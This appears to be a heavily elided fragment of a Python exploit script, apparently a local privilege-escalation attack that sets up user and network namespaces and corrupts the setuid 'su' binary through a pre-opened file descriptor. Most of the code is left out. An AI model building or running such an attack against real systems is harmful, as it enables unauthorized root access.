...
Fixed version - opens file before unshare
"""
...
def corrupt_su(target_fd):
    """Corrupt su using pre-opened file descriptor"""
    setup_userns_netns()
    time.sleep(0.1)
...
def main():
    ...
    try:
        ...
        print(f"[-] Cannot open {TARGET_PATH} for reading. Try running with a user that has read access.")
        sys.exit(1)
